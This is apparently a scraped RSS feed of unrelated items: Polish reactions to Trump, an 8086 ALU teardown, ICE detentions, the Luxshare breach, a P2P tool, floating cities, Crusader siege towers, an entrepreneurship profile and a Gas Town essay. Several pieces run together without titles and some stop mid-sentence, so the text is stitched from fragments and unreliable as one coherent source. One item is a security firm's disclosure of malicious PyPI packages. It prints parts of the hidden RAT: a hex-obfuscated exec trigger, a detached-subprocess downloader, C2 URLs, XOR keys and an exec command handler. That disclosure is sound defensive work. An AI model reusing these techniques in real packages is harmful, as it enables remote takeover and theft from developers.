We cannot do what we do without your support.General Roman Polko, who commanded Poland’s GROM special forces unit in Iraq and Afghanistan, has condemned Donald Trump’s recent comments suggesting that America’s allies have not provided frontline military support to the United States.Polko, who is now retired, called the US president “a coward who has never been on the front lines”. Meanwhile, Poland’s foreign minister, Radosław Sikorski, declared that “no one has the right to mock the service of our soldiers”.Amid tensions over Trump’s efforts to take control of Greenland, the US president has repeatedly questioned whether his country can rely on its NATO allies.“Will they be there, if we ever needed them?” Trump asked on Thursday in an interview with Fox News. “I’m not sure of that.”“We’ve never needed them. We have never really asked anything of them. You know, they’ll say they sent some troops to Afghanistan, or this or that. And they did – they stayed a little back, a little off the front lines,” he continued.In actual fact, military personnel from various NATO allies served in combat roles in the wars in Afghanistan and Iraq this century, with many losing their lives.In Afghanistan, the highest number of casualties after the United States (2,461 deaths) were for the UK (457), Canada (159), France (90), Germany (62), Italy (53) and Poland (44). In Iraq, 23 Polish soldiers were killed, behind only the US (4,492), UK (179) and Italy (33).Among those to serve in both arenas was Polko, who was commander of GROM from 2000 to 2004 and again in 2006. Since ending his military service in 2009, he has served as a security advisor to three presidents – Lech Kaczyński, Bronisław Komorowski and Andrzej Duda.General Polko (left) visiting Polish troops in Afghanistan in 2007 as head of President Lech Kaczyński’s National Security Bureau (source: BBN)Speaking on Friday to broadcaster TVN, Polko said that Trump’s latest remarks had “crossed a red line”, especially coming from someone who never served in the military.“This is the cynicism of a coward who hasn’t been on the front lines himself,” declared the general. “In this respect, he resembles Putin, who also wages wars but has never even approached the front lines himself.”Polish “veterans will not be insulted by a man who avoided military service because he had a bone spur in his heel”, added Polko, referring to the medical diagnosis used by Trump to avoid military service during the Vietnam War.Polish soldiers were “on the front lines, supporting peacekeeping efforts and risking their own lives to ensure that people were not terrorised by al-Qaeda”, noted Polko, who also called on Trump to apologise in a further interview with broadcaster TVP.Meanwhile, Poland’s defence minister, Władysław Kosiniak-Kamysz, published a statement on Friday in which he recalled that “the Polish army, shoulder to shoulder with allies, took part in missions in Afghanistan and Iraq, among others”.“Tragic moments, when our soldiers died, showed that we are ready to pay the highest price in defence of international security, of Poland’s security,” he added. “This sacrifice will never be forgotten and must not be diminished. Poland is a reliable and proven ally, and nothing will change that.”Foreign minister Radosław Sikorski also noted that the province of Ghazni, where Polish forces served in Afghanistan, was very much on the front lines. “No one has the right to mock the service of our soldiers,” he warned.Sikorski also shared an image of Poland’s President Karol Nawrocki – who is an opponent of the government and ally of Trump – meeting the US president this week, adding sarcastically: “The commander-in-chief of the [Polish] armed forces will surely assert the honour of our soldiers.”In response, Nawrocki’s spokesman, Rafał Leśkiewicz, criticised Sikorski for “exploiting Polish soldiers” for political purposes. He added that “President Karol Nawrocki, as commander-in-chief of the armed forces, has always stood, stands, and will always stand by Polish soldiers”.On Friday, British Prime Minister Keir Starmer also criticised Trump’s recent remarks about America’s allies, calling them “insulting and frankly appalling” and suggesting that the US president should apologise.

Unlike modern 64-bit processors, however, the 8086 is a 16-bit chip.
Its arithmetic/logic unit (ALU) operates on 16-bit values, performing arithmetic operations such as addition and subtraction,
as well as logic operations including bitwise AND, OR, and XOR.
The 8086's ALU is a complicated part of the chip, performing 28 operations in total.In this post, I discuss the circuitry that controls the ALU, generating the appropriate control signals for a
particular operation.
The process is more complicated than you might expect. First, a machine code instruction results in the execution of multiple
microcode instructions.
Using the ALU is a two-step process: one microcode instruction (micro-instruction) configures the ALU for the desired operation,
while a second
micro-instruction gets the results from the ALU.
Moreover, based on both the microcode micro-instruction and the machine code instruction, the control circuitry sends control signals to the ALU,
reconfiguring it for the desired operation.
Thus, this circuitry provides the "glue" between the micro-instructions and the ALU.The die photo below shows the 8086 processor under a microscope.
I've labeled the key functional blocks.
Architecturally, the chip is partitioned into a Bus Interface Unit (BIU) at the top and an Execution Unit (EU) below.
The BIU handles bus and memory activity as well as instruction prefetching, while the Execution Unit (EU) executes the instructions.
In the lower right corner, the microcode ROM holds the micro-instructions.
The ALU is in the lower left corner, with bits 7-0 above and bits 15-8 below, sandwiching the status flag circuitry.
The ALU control circuitry, highlighted in red at the bottom of the chip, is the focus of this article.The die of the 8086. Click this image (or any other) for a larger version.The 8086 processor implements most machine instructions in microcode, with a micro-instruction for each step of the machine instruction.
(I discuss the 8086's microcode in detail here.)
The 8086 uses an interesting architecture for microcode:
each micro-instruction performs two unrelated operations. The first operation moves data between a source and a destination.
The second operation can range from a jump or subroutine call to a memory read/write or an ALU operation.
An ALU operation has a five-bit field to specify a particular operation and a two-bit field to specify
which temporary register provides the input. As you'll see below, these two fields play an important role in the ALU circuitry.In many cases, the 8086's micro-instruction doesn't specify the ALU operation, leaving the details to be substituted from the machine instruction opcode.
For instance, the ADD, SUB, ADC, SBB, AND, OR, XOR, and CMP
machine instructions share the same microcode, while the hardware selects the ALU operation from the instruction opcode.
Likewise, the increment and decrement instructions use the same microcode, as do the decimal adjust instructions DAA and DAS, and the
ASCII adjust instructions AAA and AAS.
Inside the micro-instruction, all these operations are performed with a "pseudo" ALU operation called XI (for some reason).
If the microcode specifies an XI ALU operation, the hardware replaces it with the ALU operation specified in the instruction.
Another important feature of the microcode is 
that you need to perform one ALU micro-instruction to configure the ALU's operation, but the result isn't
available until a later micro-instruction, which moves the result to a destination.
This has the consequence that the hardware must remember the ALU operation.To make this concrete, here is the microcode that implements a typical arithmetic instruction such as  or .
This microcode consists of three micro-instructions. 
The left half of each micro-instruction specifies a data movement, first moving the two arguments to ALU temporary registers
and then storing the ALU result (called Σ).
The right half of each micro-instruction performs the second task.
First, the ALU is configured to perform an  operation using temporary register A. Recall that  indicates the ALU operation
is filled in from the machine instruction; this is how the same microcode handles eight different types of machine instructions.
In the second micro-instruction, the next machine instruction is started unless a memory writeback is required ().
The last micro-instruction is  (Run Next Instruction) to start a new machine instruction. It also indicates that the
processor status flags () should be updated to indicate if the ALU result is zero, positive, overflow, and so forth.M → tmpa   XI   tmpa  
R → tmpb   WB,NXT     
Σ → M      RNI  F     The ALU is the heart of a processor, performing arithmetic and logic operations.
Microprocessors of the 1970s typically supported addition and subtraction; logical AND, OR, and XOR; and various bit shift operations.
(Although the 8086 had multiply and divide instructions, these were implemented in microcode, not in the ALU.)
Since an ALU is both large and critical to performance, chip architects try to optimize its design.
As a result, different microprocessors have widely different ALU designs.
For instance, the 6502 microprocessor has separate circuits for addition and each logic operation; a multiplexer selects the appropriate
output.
The Intel 8085, on the other hand, uses an optimized clump of gates that performs the desired operation based on control signals (details), while the Z80's 4-bit ALU uses a different clump of gates (details).The 8086 takes a different approach, using two lookup tables (along with other gates) to generate the carry and output signals for each bit in the ALU.
By setting the lookup tables appropriately, the ALU can be configured to perform the desired operation.
(This is similar to how an FPGA implements arbitrary functions through lookup tables.)
The schematic below shows the circuit for one bit of the ALU.
I won't explain this circuit in detail since I explained it in an earlier article.
The relevant part of this circuit is the six control signals at the left.
The two multiplexers (trapezoidal symbols) implement the lookup tables by using the two input argument bits to select outputs from
the control signals to control carry generation and carry propagation.
Thus, by feeding appropriate control signals into the ALU, the 8086 can reconfigure the ALU to perform the desired operation.
For instance, with one set of control signals, this circuit will add. Other sets of control signals will cause the circuit to subtract
or compute a logical operation, such as AND or XOR.
The 8086 has 16 copies of this circuit, so it operates on 16-bit values.The circuit that implements one bit in the 8086's ALU.The 8086 is a complicated processor, and its instructions have many special cases, so controlling the ALU is
more complex than described above.
For instance, the compare operation is the same as a subtraction, except the numerical result of a compare is discarded; just the
status flags are updated.
The add versus add-with-carry instructions require different values for the carry into bit 0, while subtraction requires the
carry flag to be inverted since it is treated as a borrow.
The 8086's ALU supports increment and decrement operations, but also increment and decrement by 2, which requires an increment signal into bit
1 instead of bit 0.
The bit-shift operations all require special treatment. For instance, a rotate can use the carry bit or exclude the carry bit, while
and arithmetic shift right requires the top bit to be duplicated.
As a result, along with the six lookup table (LUT) control signals, the ALU also requires numerous control signals to adjust its
behavior for specific instructions.
In the next section, I'll explain how these control signals are generated.ALU control circuitry on the dieThe diagram below shows the components of the ALU control logic as they appear on the die.
The information from the micro-instruction enters at the right and is stored in the latches.
The PLAs (Programmable Logic Arrays) decode the instruction and generate the control signals.
These signals flow to the left, where they control the ALU.The ALU control logic as it appears on the die. I removed the metal layer to show the underlying polysilicon and silicon. The reddish lines are remnants of the metal.As explained earlier, if the microcode specifies the  operation, the operation field is replaced with a value based on the machine instruction opcode.
This substitution is performed by the  multiplexer before the value is stored in the operation latch.
Because of the complexity of the 8086 instruction set, the  operation is not as straightforward as you might expect.
This multiplexer gets three instruction bits from a special register called the "X" register, another instruction bit from the instruction
register, and the final bit from a decoding circuit called the Group Decode ROM.Recall that one micro-instruction specifies the ALU operation, and a later micro-instruction accesses the result. Thus, the
ALU control circuitry must remember the specified operation so it can be used later. 
In particular, the control circuitry must keep track of the ALU operation to perform and the temporary register specified.
The control circuitry uses three flip-flops to keep track of the specified temporary register, one flip-flop for each register.
The micro-instruction contains a two-bit field that specifies the temporary register. The control circuitry decodes this field and
activates the associated flip-flop.
The outputs from these flip-flops go to the ALU and enable the associated temporary register.
At the start of each machine instruction, the flip-flops are reset, so temporary register A is selected by default.The control circuitry uses five flip-flops to store the five-bit operation field from the micro-instruction.
At the start of each machine instruction, the flip-flops are reset so operation 0 (ADD) is specified by default.
One important consequence is that an add operation can potentially be performed without a micro-instruction to configure the ALU,
shortening the microcode by one micro-instruction and thus shortening the instruction time by one cycle.The five-bit output from the operation flip-flops goes to the operation PLA (Programmable Logic Array), which decodes the operation
into 27 control signals.
Many of these signals go to the ALU, where they control the behavior of the ALU for special cases.
About 15 of these signals go to the Lookup Table (LUT) PLA, which generates the six lookup table signals for the ALU.
At the left side of the LUT PLA, special high-current driver circuits amplify the control signals before they are sent to the ALU.
Details on these drivers are in the footnotes.Whenever I look at the circuitry of the 8086 processor, I see the differences between a RISC chip and a CISC chip.
In a RISC (Reduced Instruction Set Computer) processor such as ARM, instruction decoding is straightforward, as is the processor circuitry.
But in the 8086, a CISC (Complex Instruction Set Computer) processor, there are corner cases and complications everywhere.
For instance, an 8086 machine instruction sometimes specifies the ALU operation in the first byte and sometimes in the second byte,
and sometimes elsewhere, so the X register latch, the XI multiplexer, and the Group Decode ROM are needed.
The 8086's ALU includes obscure operations including four types of BCD adjustments and seven types of shifts, making the ALU more
complicated.
Of course, the continuing success of x86 shows that this complexity also has benefits.This article has been a deep dive into the details of the 8086's ALU, but I hope you have found it interesting.
If it's too much detail for you, you might prefer my overview of the 8086 ALU.]]></content:encoded></item><item><title>ICE Is So Bad At Immigration Enforcement That It’s Detaining Native Americans</title><link>https://www.techdirt.com/2026/01/23/ice-is-so-bad-at-immigration-enforcement-that-its-detaining-native-americans/</link><author>Tim Cushing</author><category>tech</category><pubDate>Fri, 23 Jan 2026 17:21:00 +0000</pubDate><source url="https://www.techdirt.com/">Techdirt</source><content:encoded><![CDATA[Obviously, that’s not how things are supposed to work here in America, which proudly considered itself to be a melting pot (albeit belatedly and after a lot of post-Civil War legislation and jurisprudence). What makes America great is the blend of people in it. And, because this nation is so large, there’s plenty of room for everyone and no non-bigot will ever claim the addition of migrants has somehow made us weaker. ICE has always been awful. It’s been even worse recently, now that it knows no one in the administration will ever prevent it from being the racist throwback Trump clearly wishes it to be. It’s even bolder now that the Supreme Court — via Justice Kavanaugh’s shadow docket concurrence — said it’s ok to engage in racial profiling.The detention of at least five men in and around Minneapolis has sparked an outcry among Native American groups about Indigenous people being racially profiled as undocumented immigrants by federal immigration agents. Minneapolis is one of the largest urban centers for Native Americans in the United States.When you’re rounding up Native Americans, you’re rounding up the people who have done the least amount of immigration ever. Anyone engaged in these arrests has migrated more times than the people they’re arresting. This — along with the recent murder of Minnesota native and US citizen Renee Good by ICE officer Jonathan Ross — should have been enough to make ICE tuck its tail between its legs and head off to a more receptive, red-coded locality.It didn’t. And because ICE neither understands nor cares, it’s up to regular American citizens to point out the obvious: “It is deeply offensive and ironic that the first people of this land would be subjected to questions around their citizenship,” Jacqueline De Leon, senior staff attorney at the nonprofit Native American Rights Fund and a member of the Isleta Pueblo. “Yet nevertheless, that is exactly what we’re seeing.”You’d think someone at ICE might want to pull back and reassess the situation, especially now that seemingly the entirety of the city of Minneapolis is willing to hassle officers into abandoning the random roll-ups on darker skinned people they constantly claim are “targeted stops.”If these truly were “targeted stops,” they wouldn’t have targeted people who have far more right to be here than the people detaining them. Jose Rodriguez, a 20-year-old Red Lake Nation descendant, was arrested by ICE in what ICE claims was a “high-risk immigration enforcement stop.” (The officers also claimed to have been “violently assaulted” by Rodriguez but, tellingly, no charges have been filed.)This was followed up by the detaining of four unhoused tribal members by ICE officers, who found them sleeping under a bridge and decided this — combined with presumably darker-than-white skin tones — was all that was needed to justify some “papers please” hassling, immediately followed by detentions that, at press time (January 14)  hadn’t been ended. (One of the four was released prior to publishing.)And it’s not like Native Americans didn’t see this coming. They read the Kavanaugh concurrence and saw what’s been happening all over this nation (but  in “blue” states) and let their fellow Americans know that they should expect ICE to treat them like any other “brown” person officers come across:A day before Ramirez’s stop, the Red Lake Tribal Council issued a Jan. 7 advisory about the Trump administration’s enforcement in Minnesota. “We all need to be extra careful, and we must assume that ICE will not protect us,” the advisory said.It’s been obvious since the inception of this so-called “immigration enforcement” surge: anyone not white would be rounded up. The Supreme Court said this is all very cool and very lawful. And the surge in Minnesota is proving that being white is no protection either, not if you’re opposed to what this regime is doing. With threats of a military deployment to Minnesota looming, no American worth their citizenship should continue pretending this is anything more than white nationalism draping itself in executive power. ]]></content:encoded></item><item><title>Apple&apos;s Secret Product Plans Stolen in Luxshare Cyberattack</title><link>https://apple.slashdot.org/story/26/01/23/1017203/apples-secret-product-plans-stolen-in-luxshare-cyberattack?utm_source=rss1.0mainlinkanon&amp;utm_medium=feed</link><author>msmash</author><category>tech</category><pubDate>Fri, 23 Jan 2026 17:20:00 +0000</pubDate><source url="https://slashdot.org/">Slashdot</source><content:encoded><![CDATA[An anonymous reader shares a report: The Apple supplier subject to a major cyberattack last month was China's Luxshare, it has now emerged. More than 1TB of confidential Apple information was reportedly stolen. 

It was reported in December that one of Apple's assemblers suffered a significant cyberattack that may have compromised sensitive production-line information and manufacturing data linked to Apple. The specific company targeted, the scope of the breach, and its operational impact were unclear until now. The attack was first revealed on RansomHub's dark web leak site on December 15, 2025, where the group claimed it had encrypted internal Luxshare systems and exfiltrated large volumes of confidential data belonging to the company and its customers. 

The attackers warned that the information would be publicly released unless Luxshare contacted them to negotiate, and accused the company of attempting to conceal the incident. According to the attackers' claims, the exfiltrated material includes vital files such as detailed 3D CAD product models and high-precision geometric files, 2D manufacturing drawings, mechanical component designs, circuit board layouts, and internal engineering PDFs. The group added that the large archives include Apple product data as well as information belonging to Nvidia, LG, Tesla, Geely, and other major clients.]]></content:encoded></item><item><title>Malicious PyPI Packages spellcheckpy and spellcheckerpy Deliver Python RAT</title><link>https://www.aikido.dev/blog/malicious-pypi-packages-spellcheckpy-and-spellcheckerpy-deliver-python-rat</link><author>/u/Advocatemack</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 17:17:23 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[On January 20th and 21st, 2026, our malware detection pipeline flagged two new PyPI packages:  and . Both claimed to be the legitimate author of pyspellchecker library. Both are linked to his real GitHub repo.Hidden inside the Basque language dictionary file was a base64-encoded payload that downloads a full-featured Python RAT. The attacker published three "dormant" versions first, payload present, trigger absent, then flipped the switch with  v1.2.0, adding an obfuscated execution trigger that fires the moment you import .The payload hiding in plain sightThe malware authors got creative. Instead of the usual suspects ( scripts, obfuscated , they buried the payload inside , a file that legitimately contains Basque word frequencies in the real  package.Here's the extraction function in :        data = json.loads(f.read())
Looks innocent. But when called with test_file("eu", "utf-8", "spellchecker"), it doesn't retrieve word frequencies. It retrieves a base64-encoded downloader hidden among the dictionary entries under a key called spellchecker.In the first three versions, the payload gets extracted and decoded... but never executed:A loaded gun with the safety on.Then came  v1.2.0. The attacker moved the trigger to  and added obfuscation:    self._evaluate = TrueDo you see it? That bytes.fromhex("65786563") decodes to "".Instead of writing  directly, which static scanners would flag,they reconstruct the string from hex at runtime. Import , instantiate it, and the RAT executes.The RAT: Full remote controlThe stage-1 payload is a downloader. It fetches the real payload from https://updatenet[.]work/settings/history.php and spawns it in a detached process:    stdin=subprocess.PIPE, 
    stdout=subprocess.DEVNULL, 
    stderr=subprocess.DEVNULL,
    start_new_session=True
)
p.stdin.write(downloaded_payload)
p.stdin.close()
That is key: The RAT survives even if your script exits. No files written to disk. Silent. Detached.The stage-2 RAT is a full-featured remote access trojan with some interesting characteristics:System fingerprinting on init:Dual-layer XOR encryption for C2 comms: The RAT uses a 16-byte XOR key ([3, 6, 2, 1, 6, 0, 4, 7, 0, 1, 9, 6, 8, 1, 2, 5]) for the outer layer, then a secondary XOR with key 123 for command payloads. Not cryptographically strong, but enough to evade signature-based detection. Commands come back as [4-byte command ID][4-byte length][XOR-encrypted payload]. The RAT parses this, decrypts, and dispatches.Arbitrary code execution: When command ID 1001 arrives, the RAT just... runs it:    exec(szCode) The RAT phones home every 5 seconds to https://updatenet[.]work/update1.php, sending its victim ID (campaign ) and waiting for commands. SSL certificate validation is disabled via ssl._create_unverified_context().The C2 domain  resolves to infrastructure with a documented history of hosting malicious activity.Registered: 28 October 2025 (approximately 3 months before malware publication)IP Address: ASN: AS14956 RouterHosting LLCLocation: Dallas, Texas, USAAssociated Domain: cloudzy.com RouterHosting LLC operates as Cloudzy, a hosting provider that has been extensively documented as a "Command-and-Control Provider" (C2P). In August 2023, Halcyon published a report titled "Cloudzy with a Chance of Ransomware" that found 40-60% of Cloudzy's traffic was malicious in nature. The report linked Cloudzy infrastructure to APT groups from China, Iran, North Korea, Russia, and other nations, as well as ransomware operators and a sanctioned Israeli spyware vendor.Connection to previous campaignsThis isn't an isolated incident. In November 2025, HelixGuard documented a similar attack using the spellcheckers package (same target, different name). That campaign used the same RAT structure: XOR encryption, command ID 1001, exec(),  but different C2 infrastructure (). The HelixGuard report linked that campaign to fake recruiter social engineering targeting cryptocurrency holders.Different domains, same playbook. This appears to be the exact same threat actor at play.  spellcheckerpy (all versions), spellcheckpy (all versions)https://updatenet[.]work/settings/history.php (stage-2 delivery)https://updatenet[.]work/update1.php (beacon endpoint) (AS14956 RouterHosting LLC / Cloudzy)XOR Key: 03 06 02 01 06 00 04 07 00 01 09 06 08 01 02 05, key spellchecker]]></content:encoded></item><item><title>Got tired of distributing large files, so I built this open-source P2P transfer CLI tool in Go</title><link>https://www.reddit.com/r/golang/comments/1qkwqxp/got_tired_of_distributing_large_files_so_i_built/</link><author>/u/samsungplay</author><category>golang</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 17:16:43 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[I recently needed to move a bunch of large files between machines and I realized how more difficult things are than it should be. I'm aware there might be some tools out there that might achieve similar things, but I still wanted to take on the challenge myself.As a result, I built a small tool to handle the cases I kept tripping over and decided to share it with the community.The goal is very simple. Just get the files from one machine to other machines and be done with it. And with no other setup other than the installation itself.It’s called . It’s written in Go and uses direct peer-to-peer transfers over QUIC. Files go straight between machines, and each receiver connects independently - which also makes it possible to share the same data with more than one machine without restarting the transfer.High throughput, direct P2P transfers over QUICTries to avoid relays via UDP hole-punching (STUN)Resume support if a connection dropsOne sender can serve multiple receiversTwo commands:  /  with default signaling, but everything can be self-hostedStill beta and actively evolvingNo default TURN relay yet (can be self-hosted)If there’s real usage, I’ll likely add a relay and maybe a GUI laterThe default signaling servers are capacity-limited but currently handle ~2k concurrent users.Since it is very easy to install and use, I hope some of you guys try it, and better yet, benefit from it in some way or the other. If you find any bugs, have any feedbacks, or if something behaves wildly, I'd really appreciate hearing about it.brew tap samsungplay/thruflux brew install thru thru host ./files thru join ABCDEFGH --out ./downloads ]]></content:encoded></item><item><title>Latest news bulletin | January 23rd, 2026 – Evening</title><link>https://www.youtube.com/watch?v=6PM1Cvhccuo</link><author>euronews</author><category>news</category><enclosure url="https://www.youtube.com/v/6PM1Cvhccuo?version=3" length="" type=""/><pubDate>Fri, 23 Jan 2026 17:12:34 +0000</pubDate><source url="https://www.youtube.com/channel/UCSrZ3UV4jOidv8ppoVuvW9Q">News - Euronews</source><content:encoded><![CDATA[Latest news bulletin | January 23rd, 2026 – Evening

It sounds like science fiction, but could soon become reality. Researchers are developing concepts for life on water - on a grand scale. Initial tests are promising. Is success a genuine possibility?

Over half of humanity lives near the coast. But in many places, flooding is a constant threat, forcing entire populations to search for new habitats. Paradoxically, these could be located directly on the water. 

Cities, floating on the ocean. It sounds like science fiction, but could soon become reality. International research has long been developing concepts for life on water. Now, new designs — from temporary huts to affordable student dormitories to smart high-tech villas — seem to hold promise. Could huge numbers of people soon be living in "floating cities”?

This futuristic living concept could have some real perks. Artificial islands can adjust to changing water levels. Modular city ‘fleets’ can change location like ships. Flexible floating neighborhoods can expand or move closer together. Efficient water management systems could supply the city with food and energy. 

But where floating cities drop anchor, questions arise: What laws do they fall under? What about environmental protection? How do they interact with the ecosystem? And how can they be protected from tsunamis? The search for answers has led to the creation of floating homes in Copenhagen and the Maldives; smart islands in the heart of Seoul; and the world's first underwater greenhouse. 

One thing is certain: in the face of climate change, we need to rethink our urbanized way of life. Will we succeed in making "floating cities” innovative, safe, and sustainable? Could we soon be experiencing a "blue revolution”?

The city's formidable walls, over 50 feet high and defended by 60,000 inhabitants, posed a massive challenge. Starved of resources after a grueling march, the Crusaders turned to innovative siege warfare: massive wooden siege towers.

These wheeled behemoths, up to 60 feet tall, were constructed from scavenged timber, including dismantled ships from Jaffa. Covered in animal hides soaked in vinegar to resist fire arrows and Greek fire, the towers shielded archers and allowed troops to approach the walls undetected. The Crusaders built three: one for Raymond's southern assault and two for Godfrey's northern push.

On July 13-14, after failed initial attacks, the towers rolled forward under cover of night. Godfrey's tower, repositioned stealthily, reached the northwest wall at dawn on July 15. From its top platform, knights like Lethold of Tournai leaped onto the battlements using a drawbridge, overwhelming defenders. This breach allowed Crusaders to pour in, leading to the city's fall after 40 days of siege. The victory resulted in a brutal massacre, claiming up to 70,000 lives, and established the Kingdom of Jerusalem.

Siege towers exemplified medieval engineering, turning a desperate siege into a triumph. They overcame Jerusalem's defenses through mobility, protection, and height, symbolizing the Crusaders' determination and tactical ingenuity in their quest to reclaim the Holy City.

What exactly does that mean? How would US soldiers and bombs help protect Germany in a worst-case scenario? What options does Germany have to move toward a European umbrella? And why is this context so relevant when assessing the current German recalibration of its international diplomacy? In this episode of Berlin Briefing, host Nina Haase talks with her guests about Germany’s deep dependencies on the United States -from NATO cooperation to nuclear deterrence. Security analyst William Alberque and DW’s Washington bureau chief Ines Pohl join Nina to unpack the diplomatic fallout from President Trump’s controversial Greenland remarks, Germany’s limited missile‑defense capabilities, and the complex realities of nuclear sharing within NATO.

But beneath all of these traits lies a quieter, less visible skill that ultimately determines success or failure: decision-making under uncertainty. Markets shift, data is incomplete, and outcomes are rarely guaranteed. The leaders who endure are not those who wait for certainty—but those who learn how to think clearly without it.According to Alessio Vinassa, serial entrepreneur and business advisor, uncertainty is not an obstacle to leadership—it is the environment in which leadership exists.“If you wait for perfect information, you’re already behind,” Vinassa says. “Entrepreneurship is the practice of making meaningful decisions with incomplete data.”Why Uncertainty Is the Entrepreneur’s Default StateUnlike corporate environments with established processes and historical benchmarks, entrepreneurial decision-making often happens in real time. Founders must decide when to hire, when to pivot, when to say no, and when to move faster—all without knowing how markets, customers, or competitors will respond.Vinassa emphasizes that uncertainty is not a phase entrepreneurs outgrow.“The idea that uncertainty disappears as companies grow is a myth,” he explains. “It simply changes shape.”At early stages, uncertainty revolves around product fit and survival. Later, it shifts toward leadership, culture, expansion, and reputation. The cognitive challenge remains the same: choosing a direction without guarantees.Decision-Making Is a Cognitive Skill, Not Just InstinctMany founders describe their decisions as “gut-driven,” but Vinassa argues that effective intuition is built—not innate.“Strong instincts are trained through exposure, reflection, and pattern recognition,” he says. “They are not emotional impulses.”Successful entrepreneurs develop internal frameworks that help them evaluate risk, weigh trade-offs, and act decisively without becoming reckless. These frameworks allow leaders to remain calm while others freeze or overreact.Separating Signal from NoiseOne of the greatest challenges in uncertain environments is information overload. Data, opinions, forecasts, and external pressure can cloud judgment.Vinassa highlights the importance of filtering.“Not all information deserves equal attention,” he notes. “Good decision-makers know what to ignore.”Experienced leaders learn to prioritize first-order effects over speculation, focusing on what directly influences outcomes rather than chasing every possible scenario. This discipline reduces cognitive fatigue and improves consistency.Reversibility vs. IrreversibilityOne mental model Vinassa frequently references is the distinction between reversible and irreversible decisions.“Most decisions are not permanent,” he explains. “Treating them as such creates unnecessary paralysis.”\
Reversible decisions—such as testing a new strategy or experimenting with a process—should be made quickly and adjusted as needed. Irreversible decisions—those affecting reputation, ethics, or long-term trust—require deeper consideration.Understanding this distinction allows entrepreneurs to move faster without becoming careless.Managing Emotional Bias Under PressureUncertainty often triggers fear, ego, or urgency. Vinassa believes emotional regulation is a critical but underestimated leadership skill.“You’re not just managing a business—you’re managing your own psychology,” he says.Effective decision-makers create distance between emotion and action. They pause, reflect, and seek perspective before committing. This does not mean avoiding risk, but approaching it with clarity rather than anxiety.Building Confidence Without CertaintyConfidence in leadership does not come from knowing outcomes—it comes from trusting one’s process.“Confidence is the belief that you can respond well, even if the decision doesn’t work out,” Vinassa explains.Entrepreneurs who view decisions as experiments rather than verdicts are better equipped to adapt. Failure becomes feedback, not identity.Decision-Making as a Team SportAs organizations grow, decision-making must scale beyond the founder. Vinassa stresses the importance of building cultures that support distributed judgment.“Strong leaders don’t make every decision,” he says. “They build systems that produce good decisions.”Clear principles, aligned incentives, and psychological safety allow teams to navigate uncertainty together rather than bottlenecking leadership.Over time, entrepreneurs who master decision-making under uncertainty gain a powerful advantage. They move faster, recover quicker, and inspire confidence in others.“People follow leaders who can stay grounded when outcomes are unclear,” Vinassa notes. In volatile markets, this steadiness becomes a competitive differentiator.Decision-making under uncertainty is not glamorous, but it is foundational. It shapes strategy, culture, and outcomes more than any single idea.As Vinassa puts it: \n  “Ideas matter, but decisions determine destiny.”\n Alessio Vinassa is a serial entrepreneur, business strategist, and thought leader focused on leadership, adaptability, and building resilient businesses in fast-changing global markets. His work centers on mentorship, innovation, and helping entrepreneurs navigate complexity with clarity and purpose.:::tip

Gas Town is entirely vibecoded, hastily designed with off-the-cuff solutions, and inefficiently burning through thousands of dollars a month in API costs. This doesn’t sound promising, but it’s lit divisive debates and sparks of change across the software engineering community. A small hype machine has formed around it. It’s made the rounds through every engineering team’s Slack, probably twice.  There’s somehow already a     doing over $400k in earnings.  And the hype is justified. First, because it’s utterly unhinged, and second because it’s a serious indication of how agents will change the nature of software development from this point on.You should at least skim through Yegge’s original article before continuing to read my reflections. First, because I’m not going to comprehensively summarise it.  And second, because even a one minute glance over Yegge’s style of writing will make the vibes clear.We should take Yegge’s creation seriously not because it’s a serious, working tool for today’s developers (it isn’t). But because it’s a good piece of speculative design fiction that asks provocative questions and reveals the shape of constraints we’ll face as agentic coding systems mature and grow.“Design fiction” or “speculative design” is a branch of design where you create things (objects, prototypes, sketches) from a plausible near future. Not to predict what’s going to happen, but to provoke questions and start conversations about what  happen. Not in a bright-and-glorious-flying-cars way that futurism can sometimes fall into. But, most helpfully, in a way that thinks about banal details, overlooked everyday interactions, low status objects, imperfect implementations, knock-on effects, and inconveniences. See the Near Future Lab’s short     and their     if you want to learn more.I also think Yegge deserves praise for exercising agency and taking a swing at a system like this, despite the inefficiencies and chaos of this iteration. And then running a public tour of his shitty, quarter-built plane while it’s mid-flight.When I was taken to the Tate Modern as a child I’d point at     pieces and say to my mother “I could do that”, and she would say “yes, but you didn’t.” Many people have talked about what large-scale, automated agent orchestration systems  look like in a few years, and no one else attempted to sincerely build it.I should be transparent and say that I have not used Gas Town in earnest on any serious work. I have only lightly poked at it, because I do not qualify as a serious user when I’m still hovering around stages 4-6 in Yegge’s 8 levels of automation:I currently juggle a handful of consecutive     and     agents, but pay close attention to the diffs and regularly check code in an IDE. Which I guess puts me in the agentically conservative camp in this distressingly breakneck moment in history.Gas Town is a full-on stage 8 piece of tooling: using an orchestrator that manages dozens+ of other coding agents for you. Yegge also warned me not to seriously use Gas Town multiple times, in increasingly threatening typography. I trust his guidance on his own slush pile.But I have grokked the basic concepts and spent more time with this manifesto than is warranted. And here is what stood out to me from the parts I could comprehend:When you have a fat stack of agents churning through code tasks, development time is no longer the bottleneck. Yegge says “Gas Town churns through implementation plans so quickly that you have to do a LOT of design and planning to keep the engine fed.” Design becomes the limiting factor: imagining what you want to create and then figuring out all the gnarly     required to make your imagination into reality.I certainly feel this friction in both my own professional work and personal projects. My development velocity is far slower than Yegge since I only wrangle a few agents at a time and keep my eyes and hands on the code. But the build time is rarely what holds me up. It is always the design; how should we architect this? What should this feel like? How should this look? Is that transition subtle enough? How composable should this be? Is this the right metaphor?When it’s not the design, it’s the product strategy and planning; What are the highest priority features to tackle? Which piece of this should we build first? When do we need to make that decision? What’s the next logical, incremental step we need to make progress here?These are the kind of decisions that agents cannot make for you. They require your human context, taste, preferences, and vision.With agents to hand, it’s easy to get ahead of yourself, stumbling forward into stacks of generated functions that should never have been prompted into existence, because they do not correctly render your intentions or achieve your goals.Gas Town seems to be halfway into this pitfall. The biggest flaw in Yegge’s creation is that it is poorly designed. I mean this in the sense that he absolutely did not design the shape of this system ahead of time, thoughtfully considering which metaphors and primitives would make this effective, efficient, easy to use, and comprehensible.He just made stuff up as he went. He says as much himself: “Gas Town is complicated. Not because I wanted it to be, but because I had to keep adding components until it was a self-sustaining machine.” Gas Town is composed of “especially difficult [theories] because it’s a 